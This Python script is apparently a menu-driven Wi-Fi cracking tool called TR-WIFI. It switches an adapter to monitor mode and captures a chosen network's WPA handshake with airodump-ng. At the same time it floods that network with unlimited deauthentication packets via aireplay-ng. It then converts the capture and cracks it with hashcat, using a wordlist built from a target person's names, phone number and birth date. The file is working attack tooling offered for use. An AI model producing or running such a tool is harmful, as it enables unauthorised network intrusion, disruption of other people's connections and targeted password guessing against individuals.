import os
import time
import subprocess
import pyfiglet
import random, string
from colorama import Fore

def banner():
    text = pyfiglet.figlet_format("TR-WIFI")
    print(f"{Fore.CYAN}{text}")
    print(Fore.YELLOW + "Developed by - TR FAHIM" + Fore.RESET)

def home_menu():
    print(f"\n\n{Fore.LIGHTBLUE_EX}[1] {Fore.WHITE}Monitor Mode\n")
    print(f"{Fore.LIGHTMAGENTA_EX}[2] {Fore.WHITE}Scan Available Wifi\n")
    print(f"{Fore.LIGHTYELLOW_EX}[3] {Fore.WHITE}Start Attack\n")
    print(f"{Fore.GREEN}[4] {Fore.WHITE}Convert Cap File\n")
    print(f"{Fore.LIGHTBLUE_EX}[5] {Fore.WHITE}Password Genator\n")
    print(f"{Fore.LIGHTMAGENTA_EX}[6] {Fore.WHITE}Hash Password Crack\n")
    print(f"{Fore.BLUE}[7] {Fore.WHITE}Show Cracked Password\n")
    print(f"{Fore.RED}[0] {Fore.WHITE}Exit")

def cl():
    os.system("clear" if os.name == "posix" else "cls")

def back_home():
    b_hm = input(f"\n{Fore.GREEN}[H] {Fore.RESET}Back Home {Fore.RED}[E] {Fore.RESET}Exit >> {Fore.CYAN}").upper()
    if b_hm == "E":
        input(Fore.RED+"\nPress Enter to EXIT >> ")
        print(Fore.BLUE+"\nClear all data. Wait Sometimes....")
        time.sleep(2)  
        os.system("ifconfig wlan0 down")
        os.system("iwconfig wlan0 mode managed")
        os.system("ifconfig wlan0 up")
        print(Fore.GREEN+"\n[+] All log clear") 
        time.sleep(2)
        print(Fore.MAGENTA+"[+] Your are on Managed mode\n")
        time.sleep(1)
        print(Fore.GREEN+"[+] Exit Sucessful\n")
        os._exit(0)
    else:
        main()

def check_root():
    return os.geteuid() == 0

def monitor_mode():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "wlan0mon" in result.stdout:
            print(Fore.GREEN + "[+] Monitor mode is already enabled on wlan0mon." + Fore.RESET)
            return

        os.system("ifconfig wlan0 down")
        os.system("iwconfig wlan0 mode monitor")
        os.system("ifconfig wlan0 up")

        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            print(Fore.GREEN + "\n[+] Monitor mode enabled successfully on wlan0." + Fore.RESET)
            print(f"{Fore.BLUE}[+] Your Wifi Interface {Fore.YELLOW}'wlan0'\n")
        else:
            print(Fore.RED + "\n[-] Monitor mode is not enabled. Please check your wireless card compatibility or try manually." + Fore.RESET)

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}" + Fore.RESET)

def wifi_scan(interface):
    os.system(f"airodump-ng {interface}")       

def start_airodump(interface, bssid, channel, filename):
    file_save = f"/root/Desktop/{filename}"
    os.system('echo -ne "Devloped by- TR FAHIM"')
    command = f"gnome-terminal -- bash -c 'airodump-ng --channel {channel} --bssid {bssid} --write {file_save} {interface}'"
    subprocess.run(command, shell=True)

def start_aireplay(interface, bssid):
    command = f"gnome-terminal -- bash -c 'aireplay-ng --deauth 0 -a {bssid} {interface}'"
    subprocess.run(command, shell=True)

def convert_cap_to_22000(cap_file, output_file):
    try:
        check_tool = subprocess.run(["which", "hcxpcapngtool"], capture_output=True, text=True)
        if not check_tool.stdout.strip():
            print(Fore.RED + "[-] hcxpcapngtool is not installed. Install it using: sudo apt install hcxtools" + Fore.RESET)
            return
        
        command = f"hcxpcapngtool -o {output_file} {cap_file}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            print(Fore.GREEN + f"\n[+] Conversion successful! Output file: {output_file}" + Fore.RESET)
        else:
            print(Fore.RED + f"\n[-] Conversion failed. Error:\n{result.stderr}" + Fore.RESET)

    except Exception as e:
        print(Fore.RED + f"\n[-] Error: {e}" + Fore.RESET)


def generate_password_list(first_name, middle_name, last_name,
                           first_name_ca, 
                           first_name_lo,
                           first_name_ti,
                           middle_name_ca,
                           middle_name_lo,
                           middle_name_ti,
                           last_name_ca,
                           last_name_lo,
                           last_name_ti,
                           phone_num,
                           birth_day,
                           birth_month,
                           birth_year,
                           ):
    
    passwords = []
    symbol_at = ("@")
    symbol_hash = ("#")
    symbol_and = ("&")
    
    passwords.append(f"{first_name}")
    passwords.append(f"{first_name_ca}")
    passwords.append(f"{first_name_lo}")
    passwords.append(f"{first_name_ti}")
    passwords.append(f"{first_name}{symbol_at}")
    passwords.append(f"{first_name_ca}{symbol_at}")
    passwords.append(f"{first_name_lo}{symbol_at}")
    passwords.append(f"{first_name_ti}{symbol_at}")
    passwords.append(f"{first_name}{symbol_hash}")
    passwords.append(f"{first_name_ca}{symbol_hash}")
    passwords.append(f"{first_name_lo}{symbol_hash}")
    passwords.append(f"{first_name_ti}{symbol_hash}")
    passwords.append(f"{first_name}{symbol_and}")
    passwords.append(f"{first_name_ca}{symbol_and}")
    passwords.append(f"{first_name_lo}{symbol_and}")
    passwords.append(f"{first_name_ti}{symbol_and}")
    if middle_name:
        passwords.append(f"{middle_name}")
        passwords.append(f"{middle_name_ca}")
        passwords.append(f"{middle_name_lo}")
        passwords.append(f"{middle_name_ti}")
        
    for zero in range (8, 21):
        passwords.append("0"*zero)
        
    passwords.append(f"{last_name}")
    passwords.append(f"{last_name_ca}")
    passwords.append(f"{last_name_lo}")
    passwords.append(f"{last_name_ti}")
    passwords.append(f"{last_name}{symbol_at}")
    passwords.append(f"{last_name_ca}{symbol_at}")
    passwords.append(f"{last_name_lo}{symbol_at}")
    passwords.append(f"{last_name_ti}{symbol_at}")
    passwords.append(f"{last_name}{symbol_hash}")
    passwords.append(f"{last_name_ca}{symbol_hash}")
    passwords.append(f"{last_name_lo}{symbol_hash}")
    passwords.append(f"{last_name_ti}{symbol_hash}")
    passwords.append(f"{last_name}{symbol_and}")
    passwords.append(f"{last_name_ca}{symbol_and}")
    passwords.append(f"{last_name_lo}{symbol_and}")
    passwords.append(f"{last_name_ti}{symbol_and}")
    
    
    full_name_1 = f"{first_name}{middle_name}{last_name}" if middle_name else f"{first_name}{last_name}"
    passwords.append(f"{full_name_1}")
    passwords.append(f"{full_name_1.upper()}")
    passwords.append(f"{full_name_1.lower()}")
    passwords.append(f"{full_name_1.title()}")
    
    full_name_2 = f"{first_name} {middle_name} {last_name}" if middle_name else f"{first_name} {last_name}"
    passwords.append(f"{full_name_2.upper()}")
    passwords.append(f"{full_name_2.lower()}")
    passwords.append(f"{full_name_2.title()}")
    
    ## NEW UPDATE 2.0
    if phone_num:
        passwords.append(f"{phone_num}")
        passwords.append(f"{first_name}{symbol_at}{phone_num}")
        passwords.append(f"{first_name}{symbol_hash}{phone_num}")
        passwords.append(f"{first_name}{symbol_and}{phone_num}")
        passwords.append(f"{last_name}{symbol_at}{phone_num}")
        passwords.append(f"{last_name}{symbol_hash}{phone_num}")
        passwords.append(f"{last_name}{symbol_and}{phone_num}")
        
    if birth_day:
        all_birth = (birth_day+birth_month+birth_year)
        passwords.append(f"{birth_day}")
        passwords.append(f"{birth_month}")
        passwords.append(f"{birth_year}")
        passwords.append(f"{all_birth}")  
        passwords.append(f"{birth_day}{birth_month}")
        passwords.append(f"{birth_month}{birth_year}")
        passwords.append(f"{birth_day}{birth_year}")
        passwords.append(f"{first_name}{phone_num}")
        passwords.append(f"{last_name}{phone_num}")
        passwords.append(f"{first_name}{birth_day}")
        passwords.append(f"{first_name}{birth_month}")
        passwords.append(f"{first_name}{birth_year}")
        passwords.append(f"{last_name}{birth_day}")
        passwords.append(f"{last_name}{birth_month}")
        passwords.append(f"{last_name}{birth_year}")
        
        passwords.append(f"{first_name}{symbol_at}{birth_day}")
        passwords.append(f"{first_name}{symbol_at}{birth_month}")
        passwords.append(f"{first_name}{symbol_at}{birth_year}")
        passwords.append(f"{first_name}{symbol_hash}{birth_day}")
        passwords.append(f"{first_name}{symbol_hash}{birth_month}")
        passwords.append(f"{first_name}{symbol_hash}{birth_year}")
        passwords.append(f"{first_name}{symbol_and}{birth_day}")
        passwords.append(f"{first_name}{symbol_and}{birth_month}")
        passwords.append(f"{first_name}{symbol_and}{birth_year}")
        passwords.append(f"{last_name}{symbol_at}{birth_day}")
        passwords.append(f"{last_name}{symbol_at}{birth_month}")
        passwords.append(f"{last_name}{symbol_at}{birth_year}")
        passwords.append(f"{last_name}{symbol_hash}{birth_day}")
        passwords.append(f"{last_name}{symbol_hash}{birth_month}")
        passwords.append(f"{last_name}{symbol_hash}{birth_year}")
        passwords.append(f"{last_name}{symbol_and}{birth_day}")
        passwords.append(f"{last_name}{symbol_and}{birth_month}")
        passwords.append(f"{last_name}{symbol_and}{birth_year}")

        passwords.append(f"{first_name}{all_birth}")
        passwords.append(f"{first_name}{symbol_at}{all_birth}")
        passwords.append(f"{first_name}{symbol_hash}{all_birth}")
        passwords.append(f"{first_name}{symbol_and}{all_birth}")
        passwords.append(f"{last_name}{all_birth}")
        passwords.append(f"{last_name}{symbol_at}{all_birth}")
        passwords.append(f"{last_name}{symbol_hash}{all_birth}")
        passwords.append(f"{last_name}{symbol_and}{all_birth}")
    
    if middle_name and birth_day:
        passwords.append(f"{middle_name}{phone_num}")
        passwords.append(f"{middle_name}{birth_day}")
        passwords.append(f"{middle_name}{birth_month}")
        passwords.append(f"{middle_name}{birth_year}")
        passwords.append(f"{middle_name}{symbol_at}{phone_num}")
        passwords.append(f"{middle_name}{symbol_hash}{phone_num}")
        passwords.append(f"{middle_name}{symbol_and}{phone_num}")
        passwords.append(f"{middle_name}{symbol_at}{birth_day}")
        passwords.append(f"{middle_name}{symbol_at}{birth_month}")
        passwords.append(f"{middle_name}{symbol_at}{birth_year}")
        passwords.append(f"{middle_name}{symbol_hash}{birth_day}")
        passwords.append(f"{middle_name}{symbol_hash}{birth_month}")
        passwords.append(f"{middle_name}{symbol_hash}{birth_year}")
        passwords.append(f"{middle_name}{symbol_and}{birth_day}")
        passwords.append(f"{middle_name}{symbol_and}{birth_month}")
        passwords.append(f"{middle_name}{symbol_and}{birth_year}")
        passwords.append(f"{middle_name}{all_birth}")
        passwords.append(f"{middle_name}{symbol_at}{all_birth}")
        passwords.append(f"{middle_name}{symbol_hash}{all_birth}")
        passwords.append(f"{middle_name}{symbol_and}{all_birth}")

    for num in range(100001): 
        digit = str(num)  
        
        passwords.append(f"{first_name}{digit}")
        passwords.append(f"{first_name_ca}{digit}")
        passwords.append(f"{first_name_lo}{digit}")
        passwords.append(f"{first_name_ti}{digit}")
        
        #Symbol_firstname
        #symbol_hash = ("@") FIRSTNAME 
        passwords.append(f"{first_name}{symbol_at}{digit}")
        passwords.append(f"{first_name_ca}{symbol_at}{digit}")
        passwords.append(f"{first_name_lo}{symbol_at}{digit}")
        passwords.append(f"{first_name_ti}{symbol_at}{digit}")
        
        #symbol_hash = ("#") FIRSTNAME
        passwords.append(f"{first_name_ca}{symbol_hash}{digit}")
        passwords.append(f"{first_name_lo}{symbol_hash}{digit}")
        passwords.append(f"{first_name_ti}{symbol_hash}{digit}")
        passwords.append(f"{first_name}{symbol_hash}{digit}")
        
        #symbol_and = ("&") FIRSTNAME
        passwords.append(f"{first_name_ca}{symbol_and}{digit}")
        passwords.append(f"{first_name}{symbol_and}{digit}")
        passwords.append(f"{first_name_lo}{symbol_and}{digit}")
        passwords.append(f"{first_name_ti}{symbol_and}{digit}")
        
        if middle_name: 
            passwords.append(f"{middle_name}{digit}")
            passwords.append(f"{middle_name_ca}{digit}")
            passwords.append(f"{middle_name_lo}{digit}")
            passwords.append(f"{middle_name_ti}{digit}")
            
            #Symbol_middlename
            # symbol_at = ("@") Middle Name
            passwords.append(f"{middle_name_ca}{symbol_at}{digit}")
            passwords.append(f"{middle_name_lo}{symbol_at}{digit}")
            passwords.append(f"{middle_name_ti}{symbol_at}{digit}")
            passwords.append(f"{middle_name}{symbol_at}{digit}")
            
            # symbol_hash = ("#")
            passwords.append(f"{middle_name_ca}{symbol_hash}{digit}")
            passwords.append(f"{middle_name_lo}{symbol_hash}{digit}")
            passwords.append(f"{middle_name_ti}{symbol_hash}{digit}")
            passwords.append(f"{middle_name}{symbol_hash}{digit}")
            
            # symbol_and = ("&")
            passwords.append(f"{middle_name_ca}{symbol_and}{digit}")
            passwords.append(f"{middle_name_lo}{symbol_and}{digit}")
            passwords.append(f"{middle_name_ti}{symbol_and}{digit}")
            passwords.append(f"{middle_name}{symbol_and}{digit}")
            
            # Symbol FirstName+MiddleName
            passwords.append(f"{first_name}{middle_name}{symbol_at}{digit}")
            passwords.append(f"{first_name_ca}{middle_name_ca}{symbol_at}{digit}")
            passwords.append(f"{first_name_lo}{middle_name_lo}{symbol_at}{digit}")
            passwords.append(f"{first_name_ti}{middle_name_ti}{symbol_at}{digit}")
            passwords.append(f"{first_name}{middle_name}{symbol_hash}{digit}")
            passwords.append(f"{first_name_ca}{middle_name_ca}{symbol_hash}{digit}")
            passwords.append(f"{first_name_lo}{middle_name_lo}{symbol_hash}{digit}")
            passwords.append(f"{first_name_ti}{middle_name_ti}{symbol_hash}{digit}")
            passwords.append(f"{first_name}{middle_name}{symbol_and}{digit}")
            passwords.append(f"{first_name_ca}{middle_name_ca}{symbol_and}{digit}")
            passwords.append(f"{first_name_lo}{middle_name_lo}{symbol_and}{digit}")
            passwords.append(f"{first_name_ti}{middle_name_ti}{symbol_and}{digit}")
            
            #Special Symbol MiddleName+LastName
            passwords.append(f"{middle_name}{last_name}{symbol_at}{digit}")
            passwords.append(f"{middle_name_ca}{last_name_ca}{symbol_at}{digit}")
            passwords.append(f"{middle_name_lo}{last_name_lo}{symbol_at}{digit}")
            passwords.append(f"{middle_name_ti}{last_name_ti}{symbol_at}{digit}")
            passwords.append(f"{middle_name}{last_name}{symbol_hash}{digit}")
            passwords.append(f"{middle_name_ca}{last_name_ca}{symbol_hash}{digit}")
            passwords.append(f"{middle_name_lo}{last_name_lo}{symbol_hash}{digit}")
            passwords.append(f"{middle_name_ti}{last_name_ti}{symbol_hash}{digit}")
            passwords.append(f"{middle_name}{last_name}{symbol_and}{digit}")
            passwords.append(f"{middle_name_ca}{last_name_ca}{symbol_and}{digit}")
            passwords.append(f"{middle_name_lo}{last_name_lo}{symbol_and}{digit}")
            passwords.append(f"{middle_name_ti}{last_name_ti}{symbol_and}{digit}")
        
        #Symbol_lastname
        # symbol_at = ("@")
        passwords.append(f"{last_name_ca}{symbol_at}{digit}")
        passwords.append(f"{last_name_lo}{symbol_at}{digit}")
        passwords.append(f"{last_name_ti}{symbol_at}{digit}")
        passwords.append(f"{last_name}{symbol_at}{digit}")
        
        # symbol_hash = ("#")
        passwords.append(f"{last_name_ca}{symbol_hash}{digit}")
        passwords.append(f"{last_name_lo}{symbol_hash}{digit}")
        passwords.append(f"{last_name_ti}{symbol_hash}{digit}")
        passwords.append(f"{last_name}{symbol_hash}{digit}")
        
        # symbol_and = ("&")
        passwords.append(f"{last_name_ca}{symbol_and}{digit}")
        passwords.append(f"{last_name_lo}{symbol_and}{digit}")
        passwords.append(f"{last_name_ti}{symbol_and}{digit}")
        passwords.append(f"{last_name}{symbol_and}{digit}")
        
        passwords.append(f"{last_name}{digit}")
        passwords.append(f"{last_name_ca}{digit}")
        passwords.append(f"{last_name_lo}{digit}")
        passwords.append(f"{last_name_ti}{digit}")
        
        full_name = f"{first_name}{middle_name}{last_name}" if middle_name else f"{first_name}{last_name}"
        passwords.append(f"{full_name}{digit}")
        passwords.append(f"{full_name.upper()}{digit}")
        passwords.append(f"{full_name.lower()}{digit}")
        passwords.append(f"{full_name.title()}{digit}")
        
        full_name_space = f"{first_name} {middle_name} {last_name}" if middle_name else f"{first_name} {last_name}"
        passwords.append(f"{full_name_space}{digit}")
        passwords.append(f"{full_name_space.upper()}{digit}")
        passwords.append(f"{full_name_space.lower()}{digit}")
        passwords.append(f"{full_name_space.title()}{digit}")
        
        full_name_cap = f"{first_name.capitalize()}{middle_name.capitalize()}{last_name.capitalize()}" if middle_name else f"{first_name.capitalize()}{last_name.capitalize()}"
        passwords.append(f"{full_name_cap}{digit}")
        
        # Special Symbol FastName+LastName
        passwords.append(f"{first_name}{last_name}{symbol_at}{digit}")
        passwords.append(f"{first_name_ca}{last_name_ca}{symbol_at}{digit}")
        passwords.append(f"{first_name_lo}{last_name_lo}{symbol_at}{digit}")
        passwords.append(f"{first_name_ti}{last_name_ti}{symbol_at}{digit}")
        passwords.append(f"{first_name}{last_name}{symbol_hash}{digit}")
        passwords.append(f"{first_name_ca}{last_name_ca}{symbol_hash}{digit}")
        passwords.append(f"{first_name_lo}{last_name_lo}{symbol_hash}{digit}")
        passwords.append(f"{first_name_ti}{last_name_ti}{symbol_hash}{digit}")
        passwords.append(f"{first_name}{last_name}{symbol_and}{digit}")
        passwords.append(f"{first_name_ca}{last_name_ca}{symbol_and}{digit}")
        passwords.append(f"{first_name_lo}{last_name_lo}{symbol_and}{digit}")
        passwords.append(f"{first_name_ti}{last_name_ti}{symbol_and}{digit}")
        
        # Special Symbol LastName+FirstName
        passwords.append(f"{last_name}{first_name}{symbol_at}{digit}")
        passwords.append(f"{last_name_ca}{first_name_ca}{symbol_at}{digit}")
        passwords.append(f"{last_name_lo}{first_name_lo}{symbol_at}{digit}")
        passwords.append(f"{last_name_ti}{first_name_ti}{symbol_at}{digit}")
        passwords.append(f"{last_name}{first_name}{symbol_hash}{digit}")
        passwords.append(f"{last_name_ca}{first_name_ca}{symbol_hash}{digit}")
        passwords.append(f"{last_name_lo}{first_name_lo}{symbol_hash}{digit}")
        passwords.append(f"{last_name_ti}{first_name_ti}{symbol_hash}{digit}")
        passwords.append(f"{last_name}{first_name}{symbol_and}{digit}")
        passwords.append(f"{last_name_ca}{first_name_ca}{symbol_and}{digit}")
        passwords.append(f"{last_name_lo}{first_name_lo}{symbol_and}{digit}")
        passwords.append(f"{last_name_ti}{first_name_ti}{symbol_and}{digit}")
        passwords.append(f"{digit}") 
        passwords.append(f"{digit}{digit}")    
                         
    return passwords

def save_to_file(passwords, filename="Custom_Passwordlist.txt"):
    with open(filename, "w") as file:
        for password in passwords:
            file.write(password + "\n")
    
    print(Fore.RED+"-"*60)      
    print(Fore.YELLOW+f"\nPassword list saved to {Fore.WHITE}'{filename}'\n")
    print(Fore.RED+"-"*60)


def hash_crack(list_path, hash_path):
    command = f"gnome-terminal -- bash -c 'hashcat -m 22000 {hash_path} {list_path}'"
    subprocess.run(command, shell=True)

def main():
    cl()
    banner()
    time.sleep(3)

    if not check_root():
        print(Fore.RED + "\n[!] This script must be run as root (use sudo)" + Fore.RESET)
        os._exit(0)

    home_menu()
    home_input = input(Fore.CYAN + "\n\n>>>> " + Fore.WHITE)

    if home_input == "1":
        cl()
        banner()
        time.sleep(4)
        print(Fore.YELLOW+"\nWait sometimes process loading........")
        monitor_mode()
        back_home()

    elif home_input == "2":
        cl()
        banner()
        time.sleep(3)
        interface = input(Fore.LIGHTBLUE_EX + "\nEnter Interface Name [wlan0] >>> " + Fore.WHITE)
        print(Fore.RED + "\nSTOP PROCESS (CTRL+C)")
        input(Fore.CYAN+"\nStart wifi scan press Enter >> ")
        wifi_scan(interface)
        back_home()

    elif home_input == "3":
        cl()
        banner()
        time.sleep(3)
        bssid = input(Fore.LIGHTMAGENTA_EX + "\nEnter Target Wifi BSSID >> " + Fore.WHITE)
        interface = input(Fore.LIGHTBLUE_EX + "\nEnter Interface Name [wlan0] >> " + Fore.WHITE)
        channel = input(Fore.YELLOW + "\nEnter Channel >> " + Fore.WHITE)
        filename = input(Fore.GREEN + "\nEnter File Name (without extension) >> " + Fore.WHITE)

        input(Fore.RED + "\nPress Enter when enough packets are captured to start cracking..." + Fore.RESET)
        start_airodump(interface, bssid, channel, filename)
        start_aireplay(interface, bssid)
        back_home()

    elif home_input == "4":
        cl()
        banner()
        time.sleep(3)
        cap_file = input(Fore.LIGHTBLUE_EX + "\nEnter the path to your .cap file: " + Fore.WHITE)
        output_file = input(Fore.LIGHTYELLOW_EX + "Enter the output .22000 file path: " + Fore.WHITE)
        
        convert_cap_to_22000(cap_file, output_file)
        back_home()
        
    elif home_input == "5":
        cl()
        banner()
        time.sleep(3)
        first_name = input(Fore.CYAN+f"\nEnter Target First Name >>{Fore.GREEN} ").strip()
        middle_name = input(Fore.CYAN+f"Enter Target Middle Name {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ").strip()
        last_name = input(Fore.CYAN+f"Enter Target Last Name >>{Fore.GREEN} ").strip()
        
        first_name_ca = first_name.upper()
        first_name_lo = first_name.lower()
        first_name_ti = first_name.title()
        middle_name_ca = middle_name.upper()
        middle_name_lo = middle_name.lower()
        middle_name_ti = middle_name.title()
        last_name_ca = last_name.upper()
        last_name_lo = last_name.lower()
        last_name_ti = last_name.title()
        
        phone_num = input(Fore.CYAN+f"Target Phone Number {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ").strip()
        
        birth_day = input(Fore.CYAN+f"\nTarget Birth Day {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ")
        birth_month = input(Fore.CYAN+f"Target Birth Month {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ")
        birth_year = input(Fore.CYAN+f"Target Birth Year {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ")
        
        case1 = random.choice(string.ascii_letters)
        case2 = random.choice(string.digits)
        random_case = (f"{first_name.upper()}_{case1}{case2}")
        
        file_name = (f"Passwordlist_{random_case}.txt")
        
        password_list = generate_password_list(first_name, middle_name, last_name,
                                            first_name_ca, 
                                            first_name_lo,
                                            first_name_ti,
                                            middle_name_ca,
                                            middle_name_lo,
                                            middle_name_ti,
                                            last_name_ca,
                                            last_name_lo,
                                            last_name_ti,
                                            phone_num,
                                            birth_day,
                                            birth_month,
                                            birth_year,
                                            )
                                        
        
        save_to_file(password_list, file_name)
        back_home()
        
    elif home_input == "6":
        cl()
        banner()
        time.sleep(3)
        hash_path = input(f"\n{Fore.LIGHTYELLOW_EX}Enter Hash file path [hack.22000] >>{Fore.CYAN} ")
        list_path = input(f"\n{Fore.YELLOW}Enter Password List Path [passlist.txt] >>{Fore.CYAN} ")
        
        hash_crack(list_path, hash_path)
        back_home()    
    
    elif home_input == "7":
        cl()
        banner()
        time.sleep(2)
        crack_file_name = input(f"\n{Fore.YELLOW}Enter File Name [example-01.cap] >>> {Fore.WHITE}")
        
        try:
            if os.geteuid() == 0:
                os.system(f"hashcat --show -m 22000 {crack_file_name}")
            else:
                os.system(f"sudo hashcat --show -m 22000 {crack_file_name}")
    
        except ValueError:
            print(Fore.RED+"\nFile Not Found Try Again\n")
            
        back_home()
    
    else:
        back_home()
    
       
        
if __name__ == "__main__":
    main()
